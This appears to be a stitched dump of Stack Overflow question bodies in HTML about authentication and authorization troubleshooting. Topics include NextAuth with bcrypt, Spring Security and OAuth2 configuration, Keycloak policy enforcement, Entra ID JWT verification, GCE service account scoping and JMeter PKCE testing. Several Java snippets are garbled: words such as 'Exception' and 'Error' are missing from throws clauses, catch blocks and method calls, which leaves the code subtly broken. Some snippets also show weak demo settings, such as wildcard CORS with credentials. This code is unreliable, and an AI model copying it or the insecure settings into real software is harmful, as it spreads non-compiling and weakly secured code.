    at normalizeUint8Array (webpack-internal:///(action-browser)/./node_modules/@panva/hkdf/dist/node/esm/index.js:21:47)
    at normalizeIkm (webpack-internal:///(action-browser)/./node_modules/@panva/hkdf/dist/node/esm/index.js:25:17)
    at hkdf (webpack-internal:///(action-browser)/./node_modules/@panva/hkdf/dist/node/esm/index.js:47:98)
    at getDerivedEncryptionKey (webpack-internal:///(action-browser)/./node_modules/@auth/core/jwt.js:144:67)
    at Object.encode (webpack-internal:///(action-browser)/./node_modules/@auth/core/jwt.js:62:36)
    at Module.callback (webpack-internal:///(action-browser)/./node_modules/@auth/core/lib/actions/callback/index.js:300:44)
    at async AuthInternal (webpack-internal:///(action-browser)/./node_modules/@auth/core/lib/index.js:67:24)
    at async Auth (webpack-internal:///(action-browser)/./node_modules/@auth/core/index.js:126:29)
    at async signIn (webpack-internal:///(action-browser)/./node_modules/next-auth/lib/actions.js:57:17)
    at async login (webpack-internal:///(action-browser)/./src/action/login.ts:28:9)
    at async E:\writeup-main\node_modules\next\dist\compiled\next-server\app-page.runtime.dev.js:39:406
    at async t0 (E:\writeup-main\node_modules\next\dist\compiled\next-server\app-page.runtime.dev.js:38:5773)
    at async rh (E:\writeup-main\node_modules\next\dist\compiled\next-server\app-page.runtime.dev.js:39:23636)
    at async doRender (E:\writeup-main\node_modules\next\dist\server\base-server.js:1391:30)
    at async cacheEntry.responseCache.get.routeKind (E:\writeup-main\node_modules\next\dist\server\base-server.js:1552:28)
    at async DevServer.renderToResponseWithComponentsImpl (E:\writeup-main\node_modules\next\dist\server\base-server.js:1460:28)
    at async DevServer.renderPageComponent (E:\writeup-main\node_modules\next\dist\server\base-server.js:1843:24)
    at async DevServer.renderToResponseImpl (E:\writeup-main\node_modules\next\dist\server\base-server.js:1881:32)
    at async DevServer.pipeImpl (E:\writeup-main\node_modules\next\dist\server\base-server.js:909:25)
    at async NextNodeServer.handleCatchallRenderRequest (E:\writeup-main\node_modules\next\dist\server\next-server.js:266:17)
    at async DevServer.handleRequestImpl (E:\writeup-main\node_modules\next\dist\server\base-server.js:805:17)
[auth][details]: {
  &quot;provider&quot;: &quot;credentials&quot;
}
</code></pre>
<p>i console.log in user i could get user with email and password but it in password match with bcrypt how could i solve this problem i tried using both bcrypt and bcryptjs but it show this error in bcryptjs in this code and other type of error in bcrypt</p>
"
"<p>I'm using SpringBoot 3.2.2 and implementing social login using OAuth2.
While writing CustomOAuth2UserService, an error occurred in the process of setting permissions.
Below is the body of the code.</p>
<pre><code>@Slf4j
@Service
@RequiredArgsConstructor
public class CustomOAuth2UserService implements OAuth2UserService&lt;OAuth2UserRequest, OAuth2User&gt; {

    private final UserRepository userRepository;

    private static final String NAVER=&quot;naver&quot;;
    private static final String KAKAO=&quot;kakao&quot;;

    @Override
    public OAuth2User loadUser(OAuth2UserRequest userRequest) throws OAuth2AuthenticationException {
        log.info(&quot;CustomOAuth2UserService.loadUser() Run - Enter OAuth2 login request&quot;);

/*
* Create a DefaultOAuth2UserService object, create a DefaultOuth2User object through loadUser(userRequest), and return it
* The loadUser() of the DefaultOAuth2UserService sends a request to the user information provider URI of the social login API
* After obtaining user information, create a DefaultOAuth2User object through it and return it.
* As a result, the OAuth2User contains user information obtained from the OAuth service
*/
        OAuth2UserService&lt;OAuth2UserRequest, OAuth2User&gt; delegate = new DefaultOAuth2UserService();
        OAuth2User oAuth2User = delegate.loadUser(userRequest);

/*
* Extract registrationId from userRequest and save SocialType to registrationId
* * http://localhost:8080/oauth2/authorization/kakao에서 kakao가 registrationId
* The userNameAttributeName is later set to nameAttributeKey.
*/

        String registrationId = userRequest.getClientRegistration().getRegistrationId();
        SocialType socialType = getSocialType(registrationId);
        String userNameAttributeName = userRequest.getClientRegistration()
                .getProviderDetails().getUserInfoEndpoint().getUserNameAttributeName();
        // The value that becomes the key (PK) at the time of OAuth2 login

        Map&lt;String, Object&gt; attributes = oAuth2User.getAttributes(); // Json value of userInfo provided by API in social login (user information)

        //  Create OAuthAttributes objects through user information according to socialType
        OAuthAttributes extractAttributes = OAuthAttributes.of(socialType, userNameAttributeName, attributes);

        User createdUser = getUser(extractAttributes, socialType); 

        // Create and return Custom OAuth2User objects that implement DefaultOuth2User
        return new CustomOAuth2User(
                Collections.singleton(new SimpleGrantedAuthority(createdUser.getRole().getKey())),
                attributes,
                extractAttributes.getNameAttributeKey(),
                createdUser.getEmail(),
                createdUser.getRole() //!!!!!error!!!!!
        );
    }
}
</code></pre>
<p>On the last line,
Required type:javax.management.relation.Role
Provided:com.Next.enums.Role error statement occurs.</p>
<p>In addition, User class block is below</p>
<pre><code>package com.Next.domain;

import com.Next.enums.SocialType;
import com.Next.enums.Role;
import jakarta.persistence.*;
import lombok.*;
import org.springframework.security.crypto.password.PasswordEncoder;

@Entity
@Builder
@Getter
@AllArgsConstructor
@NoArgsConstructor(access = AccessLevel.PROTECTED)
@Table(name = &quot;USERS&quot;)
public class User {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    @Column(name=&quot;user_id&quot;)
    private Long id;

    private String email;
    private String password;
    private String nickname;

    @Enumerated(EnumType.STRING)
    private Role role;

    @Enumerated(EnumType.STRING)
    private SocialType socialType; // KAKAO, NAVER, GOOGLE

    private String socialId; // Identifier value of the logged-in social type

    private String refreshToken;//refrsh token

    //user authorize method: GUEST,USER.--&gt;enumerated
    //Initial login-&gt; GUEST, after additional info-&gt;update to USER 
    public void authorizeUser() {
        this.role = com.Next.enums.Role.USER;
    }

    //password Encoding method
    public void passwordEncode(PasswordEncoder passwordEncoder){
        this.password=passwordEncoder.encode(this.password);
    }

    public void updateRefreshToken(String updateRefreshToken){
        this.refreshToken=updateRefreshToken;
    }

}

</code></pre>
<p>I was expecting 'getRole()' import User's Role. I don't know why the user class email is called normally, but the role is not called. I'd appreciate it if you could help me!!</p>
"
"<p>Hello :) I have some issues with spring boot update to newest stable version and my async endpoints...</p>
<p>Recently i tasked myself with bumping spring boot from 2.7.18 to 3.2.2 and I thought that it is over and it's working - nothing near !</p>
<p>I have an issue where when I return Mono or Completable Future my response losses the security context and I don't have idea how to handle it ;/
I think that's related to configurati</p>
<p>my spring boot dependencies :</p>
<pre><code>spring-boot-starter-web
spring-boot-starter-web - it is used on some of my endpoints and according to the documentation it's working on spring-mvc basis. - worked on 2.7.18
spring-boot-starter-websocket
spring-boot-starter-security
</code></pre>
<p>my example endpoints where in both cases I have same issue:</p>
<pre class=""lang-java prettyprint-override""><code>    @ResponseStatus(HttpStatus.OK)
    @GetMapping(path = &quot;/barka&quot;, produces = APPLICATION_JSON_VALUE)
    @PreAuthorize(SecurityRuleSet.ALL_USERS)
    @Operation(summary = SWAG_ALL_USERS + &quot;Get logics from specified application&quot;)
    public CompletableFuture&lt;String&gt; method() {
        return retrieverService.getBarka();
    }
      @ResponseStatus(HttpStatus.OK)
    @GetMapping(path = &quot;/logics&quot;, produces = {APPLICATION_JSON_VALUE})
    @PreAuthorize(SecurityRuleSet.ALL_USERS)
    @Operation(summary = SWAG_ALL_USERS + &quot;Get logics from specified application&quot;)
    public Mono&lt;List&lt;LogicInfoMMResponseDTO&gt;&gt; getLogics(@NotBlank @RequestParam String applicationName) {
        return retrieverService.getLogicsForFront(MMFilterableCommand.builder()
                .applicationName(applicationName).build());
    }
</code></pre>
<p>my config class:</p>
<pre class=""lang-java prettyprint-override""><code>@Configuration
@EnableWebSecurity
@RequiredArgsConstructor
@EnableMethodSecurity(securedEnabled = true, jsr250Enabled = true, prePostEnabled = true, mode = PROXY)
public class WebSecurityConfig {

    private final AbstractCookieManager abstractCookieManager;
    private final FilterChainHandler filterChainHandler;
    private final SpringJwtTokenProvider springJwtTokenProvider;

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws  {
        http.sessionManagement(session -&gt; session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
                .csrf(AbstractHttpConfigurer::disable)
                .cors(AbstractHttpConfigurer::disable)

                .authorizeHttpRequests(auth -&gt; {
                    auth

                            .anyRequest().authenticated();
                })
                .formLogin(AbstractHttpConfigurer::disable)
                .logout(AbstractHttpConfigurer::disable)
                .httpBasic(AbstractHttpConfigurer::disable)
                .addFilterBefore(filterChainHandler, UsernamePasswordAuthenticationFilter.class)
                .addFilterBefore(new CookieJwtTokenFilter(abstractCookieManager), UsernamePasswordAuthenticationFilter.class);

        return http.build();

    }

    @Bean
    public WebSecurityCustomizer configure() {
        return web -&gt; web.ignoring().requestMatchers(&quot;/api/login&quot;,&quot;/api/logout&quot;, &quot;/api/refresh-token&quot;,
                &quot;/v3/api-docs/**&quot;, &quot;/swagger-ui.html&quot;, &quot;/swagger-ui/**&quot;
                , &quot;/api/version&quot;, &quot;/api/monitoring/log&quot;, &quot;/api/jenkins-job-update&quot;
                , &quot;/ws/public/**&quot;
        );
    }


    @Bean
    public AuthenticationManager authenticationManager(HttpSecurity http)
            throws  {
        return http.getSharedObject(AuthenticationManagerBuilder.class)
                .build();
    }
    @Bean
    @RequestScope
    public UserContext requestScopeRequestData() {
        return new UserContext(springJwtTokenProvider);
    }

    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        final CorsConfiguration configuration = new CorsConfiguration();
        configuration.setAllowedOrigins(List.of(&quot;*&quot;));
        configuration.setAllowedMethods(List.of(&quot;GET&quot;, &quot;POST&quot;, &quot;PUT&quot;, &quot;PATCH&quot;, &quot;DELETE&quot;));
        configuration.setAllowCredentials(true);
        configuration.setAllowedHeaders(List.of(&quot;Authorization&quot;, &quot;Cache-Control&quot;, &quot;Content-Type&quot;));

        final UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration(&quot;/**&quot;, configuration);

        return source;
    }
}
</code></pre>
<p>Custom JWT extraction filter from JWT - I know that is not the best and spring has it's own way to handle it - it might be the issue but not and expert here and projects runs for approx 2+ years right now so there is some technical debt by now :/</p>
<pre class=""lang-java prettyprint-override""><code>@RequiredArgsConstructor
public class CookieJwtTokenFilter extends OncePerRequestFilter {

    private final AbstractCookieManager abstractCookieManager;

    @Override
    protected void doFilterInternal(@NotNull HttpServletRequest httpServletRequest, @NotNull HttpServletResponse httpServletResponse, FilterChain filterChain) throws Servlet, IO {
        String token = abstractCookieManager.resolveCookieToken(httpServletRequest);
        try {
            if (token != null &amp;&amp; abstractCookieManager.validateToken(token)) {
               var authentication =  abstractCookieManager.getAuthentication(token);
                SecurityContext sc = SecurityContextHolder.getContext();
                sc.setAuthentication(authentication);
                HttpSession session = httpServletRequest.getSession(true);
                SecurityContextHolder.getContext().setAuthentication(authentication);
                SecurityContextHolder.setContext(sc);
                session.setAttribute(SPRING_SECURITY_CONTEXT_KEY, sc);

            }
        } catch (MMGui ex) {
            SecurityContextHolder.clearContext();
            httpServletResponse.send(ex.getHttpStatus().value(), ex.getMessage());
            return;
        }
        catch ( ex) {
            SecurityContextHolder.clearContext();
            httpServletResponse.send(HttpServletResponse.SC_UNAUTHORIZED, &quot;Unauthorized&quot;);
            return;
        }
        filterChain.doFilter(httpServletRequest, httpServletResponse);
    }

}
</code></pre>
<p>and the log that informs on the issue :</p>
<pre><code>10:51:15.471 DEBUG DefaultPooledConnectionProvider - [9892e210, L:/10.9.248.21:56812 - R:/10.9.27.29:12750] onStateChange(GET{uri=/logic, connection=PooledConnection{channel=[id: 0x9892e210, L:/10.9.248.21:56812 - R:/10.9.27.29:12750]}}, [disconnecting])
10:51:15.471 DEBUG DefaultPooledConnectionProvider - [9892e210, L:/10.9.248.21:56812 - R:/10.9.27.29:12750] Releasing channel
10:51:15.472 DEBUG PooledConnectionProvider - [9892e210, L:/10.9.248.21:56812 - R:/10.9.27.29:12750] Channel cleaned, now: 0 active connections, 1 inactive connections and 0 pending acquire requests.
10:51:15.473 DEBUG FilterChainProxy - Securing GET /api/market-maker-data/logics?applicationName=mm_pancakeswap_flokibnb
10:51:15.473 DEBUG AnonymousAuthenticationFilter - Set SecurityContextHolder to anonymous SecurityContext
10:51:15.476 DEBUG Http403ForbiddenEntryPoint - Pre-authenticated entry point called. Rejecting access
10:51:15.477 DEBUG FilterChainProxy - Securing GET /?applicationName=mm_pancakeswap_flokibnb
10:51:15.477 DEBUG AnonymousAuthenticationFilter - Set SecurityContextHolder to anonymous SecurityContext
10:51:15.477 DEBUG Http403ForbiddenEntryPoint - Pre-authenticated entry point called. Rejecting access

</code></pre>
<p>I found out that if I mess in this place in my securinty config</p>
<pre class=""lang-java prettyprint-override""><code>.authorizeHttpRequests(auth -&gt; {
 auth

  .anyRequest().authenticated();
  })
</code></pre>
<p>It started to work some maybe here is an issue ? I'm not the best with upgrading with versions and I spent to much time to figure it to this place...</p>
<p>I would be grateful for any hint or clue what might the issue be and how to solve it &lt;3
B.</p>
"
"<p>I'm trying to do a very dumb and obvious thing - set up a page on my website that shows the 10 most visited blog posts for the last 30 days. I want to use GA4 data for this. This is what I did:</p>
<ol>
<li>Created a service account with View permission (<a href=""https://console.cloud.google.com/"" rel=""nofollow noreferrer"">https://console.cloud.google.com/</a>).</li>
</ol>
<p><a href=""https://i.stack.imgur.com/f1Ve5.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/f1Ve5.png"" alt=""enter image description here"" /></a></p>
<ol start=""2"">
<li>Analytics API is enabled.</li>
</ol>
<p><a href=""https://i.stack.imgur.com/4S71h.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/4S71h.png"" alt=""enter image description here"" /></a></p>
<ol start=""3"">
<li>Service account added as a Viewer into GA4 property access settings.</li>
</ol>
<p><a href=""https://i.stack.imgur.com/WLhAa.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/WLhAa.png"" alt=""enter image description here"" /></a></p>
<ol start=""4"">
<li>I'm using Nest.js back-end with the latest googleapis npm package. Here's the code:</li>
</ol>
<pre class=""lang-js prettyprint-override""><code>const auth = new google.auth.GoogleAuth({
  keyFile: '/home/...service-account.json',
  scopes: ['https://www.googleapis.com/auth/analytics.readonly']
})
</code></pre>
<p>I get <code>User does not have sufficient permissions for this profile.</code> error.</p>
<p>What do I do wrong, what have I missed?</p>
"
"<p>I'm trying to migrate my usage of Graph API from doing http requests via <code>requests</code> to using the Python SDK. I was using the <code>acquire_token_by_username_password</code> method and requests were going through correctly. When migrating to utilize the Python SDK, I'm creating my client like:</p>
<pre><code>credential = UsernamePasswordCredential(
        client_id=self._client_id,
        username=username,
        password=password,
    )
    return GraphServiceClient(credential, self._scopes)

</code></pre>
<p>and then attempting a request like:<br />
<code>await client.users.get(request_configuration=request_configuration)</code></p>
<p>However, with the same credentials as I was using in the HTTP method, I'm getting:</p>
<pre><code>  APIError
        Code: 403
        message: None
        error: MainError(additional_data={}, code='Authorization_RequestDenied', details=None, inner_error=InnerError(additional_data={}, client_request_id='53e56211-cd3d-47d5-b3fb-b6dacd6088a8', date=DateTime(2024, 2, 25, 11, 10, 15, tzinfo=Timezone('UTC')), odata_type=None, request_id='4b92be4e-d60a-4040-bcb4-e8d11a636879'), message='Insufficient privileges to complete the operation.', target=None)
</code></pre>
<p>I have attempted re consenting for the (delegated) permissions in azure; not sure what else can I do.</p>
"
"<p>I am working with Spring Cloud Gateway, built on Spring Webflux, and I aim to implement Keycloak's policy enforcement for authorization.</p>
<p>I'm using the following Keycloak adapter:</p>
<pre><code>&lt;dependency&gt;
    &lt;groupId&gt;org.keycloak&lt;/groupId&gt;
    &lt;artifactId&gt;keycloak-spring-security-adapter&lt;/artifactId&gt;
    &lt;version&gt;22.0.5&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>This adapter transitively includes the following dependencies:</p>
<pre><code>&lt;dependency&gt;
    &lt;groupId&gt;org.keycloak&lt;/groupId&gt;
    &lt;artifactId&gt;keycloak-policy-enforcer&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.keycloak&lt;/groupId&gt;
    &lt;artifactId&gt;keycloak-core&lt;/artifactId&gt;
&lt;/dependency&gt;
</code></pre>
<p>However, the Keycloak adapter only provides ServletPolicyEnforcerFilter, which is designed for servlet-based Spring applications.</p>
<p>For non-reactive applications, the policy enforcement approach is detailed in this repository: <a href=""https://github.com/keycloak/keycloak-quickstarts/blob/latest/spring/rest-authz-resource-server/src/main/java/org/keycloak/quickstart/OAuth2ResourceServerSecurityConfiguration.java"" rel=""nofollow noreferrer"">Keycloak-Quickstarts</a></p>
<p>In this approach, the Policy Enforcer requests an RPT (Requesting Party Token) from Keycloak and uses it to authorize the user for the requested resource and scope. Reusing the RPT minimizes the need for repeated interactions with Keycloak for each request.</p>
<p>However, as I am using Spring Cloud Gateway, I've implemented the Policy Enforcement differently:</p>
<ul>
<li>Created resources, role-based policies, and permissions in Keycloak.</li>
<li>Maintained a map of request URI paths and resource names defined in Keycloak.</li>
<li>Implemented a CustomReactiveAuthorizationManager by implementing the ReactiveAuthorizationManager interface.Here Iam doing the following things</li>
</ul>
<ol>
<li>Extracted the resource name from the static resource map using the request URI.</li>
<li>Made a REST call to Keycloak to evaluate whether the current user is authorized for the requested resource and scope.
Here's a snippet of the CustomReactiveAuthorizationManager:</li>
</ol>
<pre><code>public class CustomReactiveAuthorizationManager implements ReactiveAuthorizationManager&lt;AuthorizationContext&gt; {

    private final String BEARER = &quot;Bearer &quot;;
    private final AuthorizationConfigProperties authorizationConfigProperties;

    @Override
    public Mono&lt;AuthorizationDecision&gt; check(Mono&lt;Authentication&gt; authentication, AuthorizationContext context) {
        String path = context.getExchange().getRequest().getPath().toString();
        String token = context.getExchange().getRequest().getHeaders().getFirst(HttpHeaders.AUTHORIZATION);
        if (!ObjectUtils.isEmpty(token) &amp;&amp; token.startsWith(BEARER)) {
            token = token.replace(BEARER, &quot;&quot;);
            String scope = context.getExchange().getRequest().getMethod().name();
            return evaluateResourceAccess(path, token, scope);
        }
        return Mono.just(new AuthorizationDecision(false));
    }
    
     public boolean evaluateResourceAccess(String uriPath, String token, String scope) {
        String resource = authorizationConfigProperties.getResource(uriPath); //from the resource map i created in application.yml I'm getting the resource name using requestUriPath 
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
        headers.setBearerAuth(token);
        MultiValueMap&lt;String, String&gt; requestParams = new LinkedMultiValueMap&lt;&gt;();
        requestParams.add(&quot;grant_type&quot;, &quot;urn:ietf:params:oauth:grant-type:uma-ticket&quot;);
        requestParams.add(&quot;audience&quot;, clientId);
        requestParams.add(&quot;permission&quot;, resource + &quot;#&quot; + scope);
        requestParams.add(&quot;response_mode&quot;, &quot;decision&quot;);
        HttpEntity&lt;MultiValueMap&lt;String, String&gt;&gt; requestEntity = new HttpEntity&lt;&gt;(requestParams, headers);
        try {
            //making a rest call to keycloak evalute endpoint
            ResponseEntity&lt;Object&gt; responseEntity = restTemplate.postForEntity(keycloakTokenEndpoint, requestEntity, Object.class);
            return responseEntity.getStatusCode().is2xxSuccessful();
        } catch (HttpClientErrorException.Forbidden e) {
            log.error(&quot;UnAuthorized:&quot; + e.getMessage());
            return false;
        } catch (Exception ex) {
            log.error(&quot;Authorization Failed:&quot; + ex.getMessage());
            return false;
        }
    }

}

</code></pre>
<ul>
<li>Integrated this custom manager into the SecurityWebFilterChain.</li>
</ul>
<pre><code>@Bean
public SecurityWebFilterChain springSecurityFilterChain(ServerHttpSecurity http) {
    return http.csrf(ServerHttpSecurity.CsrfSpec::disable)
            .oauth2ResourceServer(oauth2 -&gt; oauth2.jwt(Customizer.withDefaults()))
            .authorizeExchange(exchange -&gt; exchange
                            .pathMatchers(&quot;/public-endpoint&quot;)
                            .permitAll()
                            .anyExchange()
                            .access(new CustomReactiveAuthorizationManager(authService)))
            .build();
}
</code></pre>
<p>Now, my concern is the number of API calls to Keycloak for evaluating access and maintaining the map of request_uri_path and resource.
For each request, a call to Keycloak is made, potentially causing performance issues.</p>
<p>While I considered the RPT approach, it also requires maintaining the path and resource map, and explicitly checking whether the requested resource and scope are present in the RPT.Also I need the centralized authorization in spring cloud gateway I don't want to delegate the authorization to each individual microservice</p>
<p>I am seeking advice on alternative approaches to achieve policy enforcement in Spring Cloud Gateway while minimizing the number of Keycloak API calls.</p>
<p>Is there any other approach that can help optimize this scenario?</p>
"
"<p>when I made a simple authorization server with <code>org.springframework.security:spring-security-oauth2-authorization-server:1.2.2</code> library.</p>
<p>I found a document on <a href=""https://docs.spring.io/spring-authorization-server/reference"" rel=""nofollow noreferrer"">https://docs.spring.io/spring-authorization-server/reference</a></p>
<p>And I tried to do like this document....</p>
<pre class=""lang-java prettyprint-override""><code>@Configuration
@EnableWebSecurity
public class SecurityConfiguration {


    @Bean
    public SecurityFilterChain securityFilterChain( HttpSecurity http ) throws Exception {
        http
                .authorizeHttpRequests( ( authorize ) -&gt; authorize
                        .requestMatchers( &quot;/oauth2/**&quot; ).authenticated()
                        .anyRequest().permitAll()
                )
                .httpBasic( Customizer.withDefaults() )
                .formLogin( Customizer.withDefaults() )
                .cors( httpSecurityCorsConfigurer -&gt; httpSecurityCorsConfigurer.disable())
                .csrf( httpSecurityCsrfConfigurer -&gt; httpSecurityCsrfConfigurer.disable());


        return http.build();
    }

    @Bean
    public AuthorizationServerSettings authorizationServerSettings(  ){

        return AuthorizationServerSettings.builder()
                .issuer( &quot;http://localhost:8000&quot; )
                .tokenEndpoint( &quot;/oauth2/v1/token&quot; )
                .tokenIntrospectionEndpoint( &quot;/oauth2/v1/verify&quot; )
                .build();
    }

    @Bean
    public OAuth2AuthorizationService authorizationService(){
        return new InMemoryOAuth2AuthorizationService();
    }

    @Bean
    public RegisteredClientRepository registeredClientRepository(){

        RegisteredClient client = RegisteredClient.withId( UUID.randomUUID().toString() )
                .clientId( &quot;user&quot; )
                .clientSecret( &quot;{noop}user&quot; )
                .clientAuthenticationMethod( ClientAuthenticationMethod.CLIENT_SECRET_BASIC )
                .authorizationGrantType( AuthorizationGrantType.AUTHORIZATION_CODE )
                .authorizationGrantType( AuthorizationGrantType.CLIENT_CREDENTIALS )
                .authorizationGrantType( AuthorizationGrantType.REFRESH_TOKEN )
                .redirectUri( &quot;http://localhost:8000/redirect&quot; )
                .tokenSettings( TokenSettings.builder().accessTokenTimeToLive( Duration.ofDays( 1 ) ).build() )
                .clientSettings( ClientSettings.builder()
                        .build() )
                .build();


        return new InMemoryRegisteredClientRepository( client );
    }

    @Bean
    public SecurityFilterChain authorizationServerSecurityFilterChain(HttpSecurity http) throws Exception {

        OAuth2AuthorizationServerConfigurer authorizationServerConfigurer =
                new OAuth2AuthorizationServerConfigurer();

        http.apply( authorizationServerConfigurer );

        authorizationServerConfigurer
                .tokenEndpoint( Customizer.withDefaults() )
                .tokenGenerator( new OAuth2AccessTokenGenerator() )
                .authorizationServerSettings( authorizationServerSettings( ) )
                .registeredClientRepository( registeredClientRepository() )
                .authorizationService( authorizationService() );
//              .setBuilder( http );


        return http.build();
    }

}
</code></pre>
<p>Here is my configuration code.</p>
<p>And I checked basic token authentication was applied.</p>
<p>but when i called token endpoint url (&quot;http://localhost:8000/oauth2/v1/token) with grant_type = client_credentials, the server return 404 error.</p>
<p>I couldn't find why they return 404 error.</p>
<p>please let me know how to set token url.</p>
<p>here is my debug log.</p>
<pre><code>2024-02-27T16:07:12.942+09:00 DEBUG 84973 --- [nio-8000-exec-8] o.s.security.web.FilterChainProxy        : Securing POST /oauth2/v1/token
2024-02-27T16:07:13.147+09:00 DEBUG 84973 --- [nio-8000-exec-8] o.s.s.a.dao.DaoAuthenticationProvider    : Authenticated user
2024-02-27T16:07:13.148+09:00 DEBUG 84973 --- [nio-8000-exec-8] o.s.s.w.a.www.BasicAuthenticationFilter  : Set SecurityContextHolder to UsernamePasswordAuthenticationToken [Principal=org.springframework.security.core.userdetails.User [Username=user, Password=[PROTECTED], Enabled=true, AccountNonExpired=true, CredentialsNonExpired=true, AccountNonLocked=true, Granted Authorities=[]], Credentials=[PROTECTED], Authenticated=true, Details=WebAuthenticationDetails [RemoteIpAddress=0:0:0:0:0:0:0:1, SessionId=null], Granted Authorities=[]]
2024-02-27T16:07:13.150+09:00 DEBUG 84973 --- [nio-8000-exec-8] o.s.security.web.FilterChainProxy        : Secured POST /oauth2/v1/token
2024-02-27T16:07:13.161+09:00 DEBUG 84973 --- [nio-8000-exec-8] o.s.security.web.FilterChainProxy        : Securing POST /error
2024-02-27T16:07:13.161+09:00 DEBUG 84973 --- [nio-8000-exec-8] o.s.security.web.FilterChainProxy        : Secured POST /error

</code></pre>
"
"<p>I am trying to override the Authorize Attribute to implement some custom logic, and after that execute the base function.</p>
<pre><code>using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.Filters;
using System.Threading.Tasks;

public class CustomAuthorizeAttribute : AuthorizeAttribute, IAsyncAuthorizationFilter
{
    public async Task OnAuthorizationAsync(AuthorizationFilterContext context)
    {
// custom logic
        await base.OnAuthorizationAsync(context); 

    }
}

</code></pre>
<p>Unfortunately, i cannot find the OnAuthorizationAsny Method in the base class, nor any other authorization methods. What am i missing? Thanks a lot</p>
<p>Searching for methods to override</p>
"
"<p>I read from the documentation that for restful controller (index, show , new , edit, create, update, destroy), you should use load_and_authorize at the top on controller. And for non-restful controllers like (report1, report2, report3), you should use authorize! manually in each function in controller.
My question is if I have a controller lets say users_controller which has all restful structure like the seven action + some other functions which I defined like change_password, etc etc, so what would be the behavior then. Clearly it is not fully restful now because I have the following actions now. ( index, show , new , edit, create, update, destroy, change_password). Should I use authorize manually in all actions or what. Please guide accordingly.</p>
"
"<p>I've been trying to validate in my back-end an access token received by my front-end application after an user logs in into the app. It authenticates the user on my Microsoft Entra ID tenant and receives an access token.
I'm passing this access token via REST api for my NodeJS back-end. The application gets the token, gets the public key using the getSigningKey() method, and passes it to the verify() method with the token.
I'm receiving an &quot;invalid signature&quot; error, but I'm retrieving the key dynamically and using the kid claim passed in the token's header, so I don't think it's a problem with the retrived key.
Here's my code:</p>
<pre><code>`const bodyParser = require(&quot;body-parser&quot;);
const express = require(&quot;express&quot;);
const cors = require(&quot;cors&quot;);
const jwt = require(&quot;jsonwebtoken&quot;);
const jwksClient = require(&quot;jwks-rsa&quot;);
const app = express();

app.use(bodyParser.json());
app.use(cors());

app.post(&quot;/v1/teste&quot;, (req, res) =&gt; {
  const entraAccessToken = req.body.token;
  try {
    validaTokenJwks(entraAccessToken);
  } catch (err) {
    console.log(`TOKEN VALIDATION GONE WRONG: ${err}`);
  }
  res.status(200).send(&quot;OK&quot;);
});

const options = [&quot;RS256&quot;];
const client = jwksClient({
  jwksUri: &quot;https://login.microsoftonline.com/common/discovery/v2.0/keys&quot;,
});
function getKey(header, callback) {
  try {
    client.getSigningKey(header.kid, function (err, key) {
      var signingKey = key.publicKey || key.rsaPublicKey;
      callback(null, signingKey);
    });
  } catch (error) {
    console.log(error);
  }
}

function validaTokenJwks(token) {
  try {
    jwt.verify(
      token,
      getKey,
      { algorithms: options, allowInvalidAsymmetricKeyTypes: false },
      function (err, decoded) {
        console.log(`VERIFY() ERROR: ${err}`);
        console.log(`DECODED: ${decoded}`);
      }
    );
  } catch (error) {
    console.log(error);
  }
}`
</code></pre>
<p>I tried mocking the public key, I tried with all the other keys provided by the OIDC specification, I logged every output possible but still couldn't verify its signature.
I'm trying to build an authorization server, and the first step is to validate the token's signature to guarantee its integrity.</p>
"
"<p>In Google Compute Engine we can assign a service account to a VM instance. However, this means that the service account credentials are accessible to any process running on the VM via the metadata server.</p>
<p>Suppose now we have:</p>
<ul>
<li>a Linux user A or container on the VM running code that has no need to use the service account (and may be more vulnerable);</li>
<li>another Linux user B running fully trusted code which does require access to the service account.</li>
</ul>
<p>Good security practices imply we should only grant Linux user B access to the service account. What is the recommended way to achieve this?</p>
<p>Some thoughts:</p>
<ul>
<li>We could firewall off the metadata server's IP from the user A's processes, but this doesn't feel very robust (the IP does seem fixed for now but I cannot find in the official documentation that one should depend on this).</li>
<li>We could generate service account keys and store them in a file that only user B can read. However, this has many drawbacks such as: (1) account keys require more manual management and this increases risk (therefore the <a href=""https://cloud.google.com/docs/authentication/provide-credentials-adc#local-key"" rel=""nofollow noreferrer"">official documentation</a> recommends against using them whenever possible), (2) we need to somehow provision these keys ourselves and cannot immediately use them in our startup scripts (we could add them using guest metadata and remove them in the startup script after reading them, but the <a href=""https://cloud.google.com/compute/docs/metadata/manage-guest-attributes#when_to_use_guest_attributes"" rel=""nofollow noreferrer"">official documentation</a> recommends not storing sensitive data here)</li>
</ul>
"
"<p>I have some concerns regarding the authentication process solely relying on the hasIpAddress configuration in Spring Security. When I configure the X-Forwarded-For header in both Tomcat and Undertow, I notice that they take the first value and place it into the remoteAddr of the servlet.</p>
<p>However, considering that the X-Forwarded-For header can be spoofed, I'm wondering if relying solely on this configuration for authentication is secure. Additionally, I'm curious why Spring Security continues to maintain this configuration despite being aware of this vulnerability.</p>
"
"<p>I am using jmeter for load testing and website for login is using Authorisation Code Flow with PKCE. I am getting 500 response in my signin-oidc sampler result of Jmeter Script. All other endpoints are getting 200 response.</p>
<p>In my Jmeter Script, I am generating code verifier and code challenge when the user clicks on login &quot;/login&quot; and passing on the code challenge in the request parameters of &quot;/connect/authorize&quot;. I get the code in the response of &quot;Account/Login?ReturnUrl..................&quot; where I have passed username and password in request parameter. Then in &quot;/connect/authorize/callback&quot; as well I am passing the same codeChallenge and extracting the value of code and then passing this code value to the &quot;/signin-oidc&quot; alongwith the code verifier generated in &quot;/login&quot;. All the endpoint passes except &quot;/signin-oidc&quot;. What mistake am I making?</p>
"
